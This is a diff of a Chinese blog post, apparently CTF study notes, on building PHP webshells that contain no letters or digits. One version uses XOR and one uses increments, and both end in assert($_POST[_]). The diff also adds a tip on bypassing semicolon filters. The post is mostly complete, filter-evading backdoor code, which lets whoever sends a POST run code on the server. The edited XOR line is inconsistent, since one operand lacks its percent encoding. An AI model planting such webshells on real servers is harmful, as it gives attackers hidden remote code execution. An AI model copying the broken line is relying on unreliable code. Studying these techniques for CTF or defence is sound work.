@@ -58,7 +58,7 @@
 <meta property="og:site_name" content="Gee">
 <meta property="og:description" content="在做文件上传或者命令执行的题的时候经常会遇到禁用字母和数字的题目，所以我这里学习记录一下：虽然禁用了字母和数字，但是我们可以利用一些特殊的运算符，来将一些字符组合成字母和数字所以首先我们来了解一下php中的异或的概念：在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串比如">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-05-05T05:46:00.525Z">
+<meta property="og:updated_time" content="2020-06-01T03:17:10.289Z">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="http://yoursite.com/2020/05/04/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%9A%84webshell/">
@@ -234,7 +234,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-05 13:46:00" itemprop="dateModified" datetime="2020-05-05T13:46:00+08:00">2020-05-05</time>
+                <time title="修改时间：2020-06-01 11:17:10" itemprop="dateModified" datetime="2020-06-01T11:17:10+08:00">2020-06-01</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -260,9 +260,10 @@
 
       
         <p>在做文件上传或者命令执行的题的时候经常会遇到禁用字母和数字的题目，所以我这里学习记录一下：<br>虽然禁用了字母和数字，但是我们可以利用一些特殊的运算符，来将一些字符组合成字母和数字<br>所以首先我们来了解一下php中的异或的概念：<br>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串<br>比如我们想要构造字母A，A的ascii值为65，对应的二进制数为：1000001，我们就可以用字符：{和:来构造，{的ascii码值对应的二进制为：1111011。而<br>:对应的二进制为0111010,两个进行异或操作之后为1000001也就是字母A，我们也可以用同样的方法去构造其他字母（对于有些不可打印字符可以用url编码表示），类似于异或，我们同样也可以用其他运算符;比如取反来构造字母，下面是个典型的用异或来构造无字母的webshell</p><a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=(chr(1)^&apos;`&apos;).(chr(19)^&apos;`&apos;).(chr(19)^&apos;`&apos;).(chr(5)^&apos;`&apos;).(chr(18)^&apos;`&apos;).(chr(20)^&apos;`&apos;); // $_=&apos;assert&apos;;</span><br><span class="line">$__=&apos;_&apos;.(chr(13)^&apos;]&apos;).(chr(47)^&apos;`&apos;).(chr(14)^&apos;]&apos;).(chr(9)^&apos;]&apos;); // $__=&apos;_POST&apos;;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); // assert($_POST[_]);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=(&apos;%1&apos;^&apos;`&apos;).(&apos;%19&apos;^&apos;`&apos;).(&apos;%19&apos;^&apos;`&apos;).(&apos;%5&apos;^&apos;`&apos;).(&apos;%18&apos;^&apos;`&apos;).(&apos;20&apos;^&apos;`&apos;); // $_=&apos;assert&apos;;</span><br><span class="line">$__=&apos;_&apos;.(&apos;%13&apos;^&apos;]&apos;).(&apos;%47&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;]&apos;).(&apos;%9&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); // assert($_POST[_]);</span><br></pre></td></tr></table></figure>
 <p>如果不能用位运算符，如何构造一个没有字母和数字的webshell，我们可以考虑自增运算符，PHP中未定义的变量默认值为null,null==false==0,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。那如何通过自增运算符的到字符呢。一直’a’++=‘b’，所以我们如果能得到字母a就可以通过自增得到其他25个字母，字母a我们可以通过数组（Array）第一个大写的字母A和第四个小写字母a得到，通过$<em>=@”$</em>“即可得到字符串Arrary再通过<br>$_[‘!’==’@’]（‘!’==’@’表示假也就是0）得到第一个字母也就是大写的A.用自增运算符构造的webshell：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;</span><br><span class="line">$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // $___=AS</span><br><span class="line">$___.=$__; // $___=ASS</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E </span><br><span class="line">$___.=$__;//$___=ASSE</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class="line">$___.=$__;//$___=ASSER</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$___.=$__;//$___=ASSERT</span><br><span class="line"></span><br><span class="line">$____=&apos;_&apos;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class="line">$____.=$__;//$____=_P</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class="line">$____.=$__;//$____=_PO</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class="line">$____.=$__;//$____=_POS</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$____.=$__;//$____=_POST</span><br><span class="line"></span><br><span class="line">$_=$$____;//$_=$_POST</span><br><span class="line">$___($_[_]); // ASSERT($_POST[_])</span><br></pre></td></tr></table></figure>
+<p>补充有些题目会过滤;号，可以用短标签&lt;&gt;绕过</p>
 
     </div>
 
@@ -347,7 +348,7 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
